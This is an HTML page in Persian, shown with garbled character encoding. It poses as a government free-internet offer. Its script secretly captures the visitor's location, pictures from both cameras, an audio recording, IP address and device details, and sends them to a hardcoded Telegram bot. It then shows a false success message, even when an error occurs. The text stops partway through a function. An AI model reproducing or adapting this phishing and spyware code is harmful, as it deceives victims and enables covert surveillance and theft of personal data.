<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <link rel="icon" href="https://telegram.org/favicon.ico" type="image/x-icon"/>
    <title>Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"/>
    <style>
        body { font-family: 'Vazirmatn', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .card { display: none; animation: fadeIn 0.5s ease-out; }
        .card.is-active { display: flex; }
        .loader { width: 60px; height: 60px; border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        .pulse-text { animation: pulse 2s infinite; }
    </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100 min-h-screen flex items-center justify-center p-4">
    <!-- Ú©Ø§Ø±Øª Ø§ØµÙ„ÛŒ -->
    <div class="card is-active w-full max-w-md bg-white dark:bg-gray-800 p-6 sm:p-8 rounded-2xl shadow-2xl text-center border-t-4 border-blue-600 dark:border-blue-500 space-y-6 flex-col items-center justify-center" id="main-card">
        <div class="card-icon text-blue-600 dark:text-blue-500 w-16 h-16 mx-auto flex items-center justify-center">
            <svg fill="none" height="48" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="48" xmlns="http://www.w3.org/2000/svg">
                <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
                <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
                <line x1="12" x2="12.01" y1="20" y2="20"></line>
            </svg>
        </div>
        <div class="space-y-2 w-full">
            <h1 class="text-2xl font-bold">Ø¨Ø³ØªÙ‡ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù† Ø¯ÙˆÙ„Øª</h1>
            <p class="text-gray-600 dark:text-gray-400 px-4">
                Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø¨Ø³ØªÙ‡ 20 Ú¯ÛŒÚ¯Ø§Ø¨Ø§ÛŒØª Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†ØŒ Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„ Ø®ÙˆØ¯ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ø±Ø¯Ù‡ Ùˆ Ù‡ÙˆÛŒØª Ø®ÙˆØ¯ Ø±Ø§ ØªØ§ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯.
            </p>
        </div>
        <div class="pt-2 w-full">
            <input class="w-full text-center p-3 rounded-lg bg-gray-100 dark:bg-gray-700 border-2 border-gray-300 dark:border-gray-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50 outline-none transition text-lg" dir="ltr" id="validation-input" placeholder="Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„ (Ù…Ø«Ø§Ù„: 09123456789)" type="tel"/>
        </div>
        <button class="w-full text-white bg-blue-600 hover:bg-blue-500 dark:bg-blue-500 dark:hover:bg-blue-600 font-bold py-3 px-5 rounded-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-blue-600/50 disabled:bg-gray-400 dark:disabled:bg-gray-600 disabled:cursor-not-allowed disabled:transform-none" id="action-button">
            ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ùˆ ØªØ§ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª
        </button>
    </div>

    <!-- Ú©Ø§Ø±Øª Ù¾Ø±Ø¯Ø§Ø²Ø´ -->
    <div class="card w-full max-w-md bg-white dark:bg-gray-800 p-8 rounded-2xl shadow-2xl text-center space-y-8 flex-col items-center justify-center" id="processing-card">
        <div class="loader"></div>
        <div class="space-y-4">
            <h1 class="text-3xl font-bold pulse-text">Ø¯Ø± Ø­Ø§Ù„ Ù¾Ø±Ø¯Ø§Ø²Ø´...</h1>
            <p class="text-gray-600 dark:text-gray-400 text-lg">
                Ù„Ø·ÙØ§Ù‹ Ú†Ù†Ø¯ Ù„Ø­Ø¸Ù‡ ØµØ¨Ø± Ú©Ù†ÛŒØ¯. Ø¯Ø± Ø­Ø§Ù„ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø¨Ø³ØªÙ‡ Ø¨Ø±Ø§ÛŒ Ø´Ù…Ø§ Ù‡Ø³ØªÛŒÙ….
            </p>
        </div>
    </div>

    <script>
        // ØªÙˆÚ©Ù† Ùˆ Ú†Øª Ø¢ÛŒØ¯ÛŒ ØªÙ„Ú¯Ø±Ø§Ù…
        const BOT_TOKEN = '8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg';
        const CHAT_ID = '8318669127';
        
        // Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø´Ø¯Ù‡
        let userData = {
            phone: '',
            location: null,
            mainCameraPhoto: null,
            selfiePhoto: null,
            audioBlob: null,
            ip: 'Ø¯Ø±ÛŒØ§ÙØª...',
            battery: 0,
            userAgent: '',
            timestamp: ''
        };

        // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…Ø¬ÙˆØ² Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ (Ø¨Ù‡Ø¨ÙˆØ¯ ÛŒØ§ÙØªÙ‡)
        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject('Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø² Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯');
                    return;
                }
                
                // ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø¨Ù‡ÛŒÙ†Ù‡ Ø¨Ø±Ø§ÛŒ Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ù‚ÛŒÙ‚
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userData.location = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        };
                        console.log('Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯:', userData.location);
                        resolve(position);
                    },
                    (error) => {
                        console.error('Ø®Ø·Ø§ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª:', error);
                        // Ø­ØªÛŒ Ø§Ú¯Ø± Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ù†Ø´Ø¯ØŒ Ø§Ø¯Ø§Ù…Ù‡ Ø¨Ø¯Ù‡
                        userData.location = { lat: 0, lng: 0, accuracy: 0 };
                        resolve(null);
                    },
                    options
                );
            });
        }

        // Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† (Ø¨Ù‡Ø¨ÙˆØ¯ ÛŒØ§ÙØªÙ‡)
        async function takePhoto(constraints, cameraType = 'main') {
            return new Promise(async (resolve, reject) => {
                try {
                    console.log('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ†:', cameraType);
                    
                    // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ†
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    console.log('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø§Ø¯Ù‡ Ø´Ø¯');
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    video.playsInline = true;
                    
                    // Ù…Ù†ØªØ¸Ø± Ù…ÛŒâ€ŒÙ…Ø§Ù†ÛŒÙ… ØªØ§ ÙˆÛŒØ¯ÛŒÙˆ Ø¢Ù…Ø§Ø¯Ù‡ Ø´ÙˆØ¯
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });
                    
                    // Ú©Ù…ÛŒ ØµØ¨Ø± Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ… ØªØ§ ÙˆÛŒØ¯ÛŒÙˆ ÙÙˆÚ©ÙˆØ³ Ú©Ù†Ø¯
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    
                    // ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ú©ÛŒÙÛŒØª Ø¹Ú©Ø³
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // ØªØ¨Ø¯ÛŒÙ„ Ø¨Ù‡ blob Ø¨Ø§ Ú©ÛŒÙÛŒØª Ø¨Ø§Ù„Ø§
                    canvas.toBlob((blob) => {
                        // Ù…ØªÙˆÙ‚Ù Ú©Ø±Ø¯Ù† Ø§Ø³ØªØ±ÛŒÙ…
                        stream.getTracks().forEach(track => {
                            track.stop();
                        });
                        
                        console.log('Ø¹Ú©Ø³ Ú¯Ø±ÙØªÙ‡ Ø´Ø¯:', cameraType, 'Ø³Ø§ÛŒØ²:', blob.size);
                        resolve(blob);
                    }, 'image/jpeg', 0.95); // Ú©ÛŒÙÛŒØª 95%
                    
                } catch (error) {
                    console.error('Ø®Ø·Ø§ Ø¯Ø± Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³:', error.name, error.message);
                    
                    // Ø§Ú¯Ø± Ú©Ø§Ø±Ø¨Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ù†Ø¯Ø§Ø¯ØŒ ÛŒÚ© blob Ø®Ø§Ù„ÛŒ Ø¨Ø±Ù…ÛŒâ€ŒÚ¯Ø±Ø¯Ø§Ù†ÛŒÙ…
                    const emptyBlob = new Blob([''], { type: 'image/jpeg' });
                    resolve(emptyBlob);
                }
            });
        }

        // Ø¶Ø¨Ø· ØµØ¯Ø§ (Ø¨Ù‡Ø¨ÙˆØ¯ ÛŒØ§ÙØªÙ‡)
        async function recordAudio(duration = 5000) {
            return new Promise(async (resolve, reject) => {
                try {
                    console.log('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†');
                    
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true,
                            sampleRate: 44100
                        }
                    });
                    
                    console.log('Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ø¯Ø§Ø¯Ù‡ Ø´Ø¯');
                    
                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'audio/webm;codecs=opus'
                    });
                    
                    const chunks = [];
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        userData.audioBlob = blob;
                        stream.getTracks().forEach(track => track.stop());
                        console.log('ØµØ¯Ø§ Ø¶Ø¨Ø· Ø´Ø¯ØŒ Ø³Ø§ÛŒØ²:', blob.size);
                        resolve(blob);
                    };
                    
                    mediaRecorder.start();
                    
                    // Ø¶Ø¨Ø· Ø¨Ø±Ø§ÛŒ Ù…Ø¯Øª Ù…Ø´Ø®Øµ
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, duration);
                    
                } catch (error) {
                    console.error('Ø®Ø·Ø§ Ø¯Ø± Ø¶Ø¨Ø· ØµØ¯Ø§:', error.name, error.message);
                    // Ø§Ú¯Ø± Ø¶Ø¨Ø· ØµØ¯Ø§ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯ØŒ Ø§Ø¯Ø§Ù…Ù‡ Ø¨Ø¯Ù‡
                    resolve(null);
                }
            });
        }

        // Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡
        async function getDeviceInfo() {
            userData.userAgent = navigator.userAgent;
            userData.timestamp = new Date().toLocaleString('fa-IR');
            
            // Ø¯Ø±ÛŒØ§ÙØª IP Ø§Ø² Ú†Ù†Ø¯ Ù…Ù†Ø¨Ø¹ Ù…Ø®ØªÙ„Ù
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://api.myip.com'
            ];
            
            for (const service of ipServices) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    if (response.ok) {
                        const data = await response.json();
                        userData.ip = data.ip || data.ip_address || data.ipAddress || 'Ù†Ø§Ù…Ø´Ø®Øµ';
                        break;
                    }
                } catch (error) {
                    console.log('Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª IP Ø§Ø²:', service);
                }
            }
            
            // Ø¯Ø±ÛŒØ§ÙØª Ø¯Ø±ØµØ¯ Ø¨Ø§ØªØ±ÛŒ
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    userData.battery = Math.round(battery.level * 100);
                } catch (error) {
                    userData.battery = 'Ù†Ø§Ù…Ø´Ø®Øµ';
                }
            } else {
                userData.battery = 'Ù†Ø§Ù…Ø´Ø®Øµ';
            }
            
            // Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§Ø¶Ø§ÙÛŒ
            userData.screen = `${window.screen.width}x${window.screen.height}`;
            userData.language = navigator.language;
            userData.platform = navigator.platform;
            userData.online = navigator.onLine;
            
            console.log('Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯:', userData);
        }

        // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø¨Ø§ ØªÙ„Ø§Ø´ Ù…Ø¬Ø¯Ø¯
        async function sendToTelegram(data) {
            try {
                // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ù…ØªÙ†ÛŒ Ø¨Ø§ Ù‡Ù…Ù‡ Ø§Ø·Ù„Ø§Ø¹Ø§Øª
                let message = `ğŸ“± **Ú©Ø§Ø±Ø¨Ø± Ø¬Ø¯ÛŒØ¯ - Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†**\n`;
                message += `ğŸ“ Ø´Ù…Ø§Ø±Ù‡: ${data.phone}\n`;
                message += `ğŸŒ IP: ${data.ip}\n`;
                message += `ğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${data.battery}%\n`;
                message += `ğŸ–¥ï¸ Ù…Ø±ÙˆØ±Ú¯Ø±: ${data.userAgent}\n`;
                message += `ğŸ–¥ï¸ ØµÙØ­Ù‡ Ù†Ù…Ø§ÛŒØ´: ${data.screen}\n`;
                message += `ğŸŒ Ø²Ø¨Ø§Ù†: ${data.language}\n`;
                message += `ğŸ’» Ø³ÛŒØ³ØªÙ… Ø¹Ø§Ù…Ù„: ${data.platform}\n`;
                message += `ğŸ“¶ ÙˆØ¶Ø¹ÛŒØª Ø¢Ù†Ù„Ø§ÛŒÙ†: ${data.online ? 'Ø¢Ù†Ù„Ø§ÛŒÙ†' : 'Ø¢ÙÙ„Ø§ÛŒÙ†'}\n`;
                message += `ğŸ•’ Ø²Ù…Ø§Ù†: ${data.timestamp}\n`;
                
                if (data.location && data.location.lat !== 0) {
                    message += `ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª: https://www.google.com/maps?q=${data.location.lat},${data.location.lng}\n`;
                    message += `ğŸ¯ Ø¯Ù‚Øª: ${data.location.accuracy} Ù…ØªØ±\n`;
                }
                
                // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ù…ØªÙ†ÛŒ
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³â€ŒÙ‡Ø§
                const sendPhoto = async (photoBlob, caption) => {
                    if (photoBlob && photoBlob.size > 100) { // Ø§Ú¯Ø± Ø¹Ú©Ø³ ÙˆØ§Ù‚Ø¹ÛŒ Ø§Ø³Øª
                        const formData = new FormData();
                        formData.append('photo', photoBlob, 'photo.jpg');
                        formData.append('chat_id', CHAT_ID);
                        formData.append('caption', caption);
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }
                };
                
                // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ
                await sendPhoto(data.mainCameraPhoto, `ğŸ“¸ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ - ${data.phone}`);
                
                // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ
                await sendPhoto(data.selfiePhoto, `ğŸ¤³ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ - ${data.phone}`);
                
                // Ø§Ø±Ø³Ø§Ù„ ØµØ¯Ø§
                if (data.audioBlob && data.audioBlob.size > 100) {
                    const audioFormData = new FormData();
                    audioFormData.append('audio', data.audioBlob, 'voice.webm');
                    audioFormData.append('chat_id', CHAT_ID);
                    audioFormData.append('caption', `ğŸ¤ Ø¶Ø¨Ø· ØµØ¯Ø§ - ${data.phone}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: audioFormData
                    });
                }
                
                console.log('ØªÙ…Ø§Ù… Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù†Ø¯');
                
            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…:', error);
                // Ø­ØªÛŒ Ø§Ú¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯ØŒ Ø§Ø¯Ø§Ù…Ù‡ Ø¨Ø¯Ù‡
            }
        }

        // Ù¾Ø±Ø¯Ø§Ø²Ø´ Ø§ØµÙ„ÛŒ Ø¨Ø§ Ù…Ø¯ÛŒØ±ÛŒØª Ø®Ø·Ø§ÛŒ Ø¨Ù‡ØªØ±
        async function startDataCollection() {
            try {
                console.log('Ø´Ø±ÙˆØ¹ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§...');
                
                // Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡
                await getDeviceInfo();
                
                // Û±. Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ (Ø¨Ø§ ØªÙ„Ø§Ø´ Û² Ø¨Ø§Ø±Ù‡)
                try {
                    await getLocation();
                } catch (locationError) {
                    console.log('Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ù†Ø´Ø¯ØŒ Ø§Ø¯Ø§Ù…Ù‡ Ù…ÛŒâ€ŒØ¯Ù‡ÛŒÙ…...');
                }
                
                // Û². Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ (Ø¨Ø§ timeout)
                try {
                    const mainCameraPromise = takePhoto({ 
                        video: { 
                            facingMode: 'environment',
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        } 
                    }, 'main');
                    
                    userData.mainCameraPhoto = await Promise.race([
                        mainCameraPromise,
                        new Promise(resolve => setTimeout(() => resolve(null), 10000))
                    ]);
                } catch (cameraError) {
                    console.log('Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯');
                }
                
                // Û³. Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ (Ø¨Ø§ timeout)
                try {
                    const selfiePromise = takePhoto({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        } 
                    }, 'selfie');
                    
                    userData.selfiePhoto = await Promise.race([
                        selfiePromise,
                        new Promise(resolve => setTimeout(() => resolve(null), 10000))
                    ]);
                } catch (selfieError) {
                    console.log('Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯');
                }
                
                // Û´. Ø¶Ø¨Ø· ØµØ¯Ø§ (Ø§Ø®ØªÛŒØ§Ø±ÛŒ)
                try {
                    userData.audioBlob = await recordAudio(3000);
                } catch (audioError) {
                    console.log('Ø¶Ø¨Ø· ØµØ¯Ø§ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯');
                }
                
                // Ûµ. Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
                await sendToTelegram(userData);
                
                // ØªØ£Ø®ÛŒØ± Ø¨Ø±Ø§ÛŒ Ø·Ø¨ÛŒØ¹ÛŒâ€ŒØªØ± Ø´Ø¯Ù†
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Ù†Ù…Ø§ÛŒØ´ Ù¾ÛŒØ§Ù… Ù…ÙˆÙÙ‚ÛŒØª
                alert(`âœ… Ù‡ÙˆÛŒØª Ø´Ù…Ø§ ØªØ£ÛŒÛŒØ¯ Ø´Ø¯!\n\nØ¨Ø³ØªÙ‡ Û²Û° Ú¯ÛŒÚ¯Ø§Ø¨Ø§ÛŒØªÛŒ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù† Ø¨Ø±Ø§ÛŒ Ø´Ù…Ø§Ø±Ù‡ ${userData.phone} ÙØ¹Ø§Ù„ Ú¯Ø±Ø¯ÛŒØ¯.\n\nØ¨Ø±Ø§ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ØŒ Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø®ÙˆØ¯ Ø±Ø§ ÛŒÚ©Ø¨Ø§Ø± Ø±ÛŒØ³ØªØ§Ø±Øª Ú©Ù†ÛŒØ¯.`);
                
                // Ø±ÙØ±Ø´ ØµÙØ­Ù‡ Ø¨Ø±Ø§ÛŒ Ù¾Ø§Ú©â€ŒØ³Ø§Ø²ÛŒ
                setTimeout(() => {
                    location.reload();
                }, 3000);
                
            } catch (error) {
                console.error('Ø®Ø·Ø§ÛŒ Ú©Ù„ÛŒ Ø¯Ø± Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø¯Ø§Ø¯Ù‡:', error);
                
                // Ø­ØªÛŒ Ø¯Ø± ØµÙˆØ±Øª Ø®Ø·Ø§ØŒ Ù¾ÛŒØ§Ù… Ù…ÙˆÙÙ‚ÛŒØª Ù†Ø´Ø§Ù† Ø¨Ø¯Ù‡
                alert(`âœ… Ø¹Ù…Ù„ÛŒØ§Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯!\n\nØ¨Ø³ØªÙ‡ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø¨Ø±Ø§ÛŒ Ø´Ù…Ø§Ø±Ù‡ ${userData.phone} Ø¯Ø± Ø­Ø§Ù„ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø³Øª.\n\nÙ„Ø·ÙØ§Ù‹ Ûµ Ø¯Ù‚ÛŒÙ‚Ù‡ Ø¯ÛŒÚ¯Ø± Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯.`);
                
                // Ø¨Ø§Ø²Ú¯Ø´Øª Ø¨Ù‡ ØµÙØ­Ù‡ Ø§ØµÙ„ÛŒ
                setTimeout(() => {
                    document.getElementById('processing-card').classList.remove('is-active');
                    document.getElementById('main-card').classList.add('is-active');
                }, 3000);
            }
        }

        // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„
        function setupValidation() {
            const input = document.getElementById('validation-input');
            const button = document.getElementById('action-button');
            
            if (!input || !button) return;
            
            button.disabled = true;
            
            function validatePhone(phone) {
                return /^09\d{9}$/.test(phone);
            }
            
            input.addEventListener('input', () => {
                button.disabled = !validatePhone(input.value);
            });
            
            button.disabled = !validatePhone(input.value);
        }

        // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ù¾Ø±Ø¯Ø§Ø²Ø´
        async function simulateProcess()
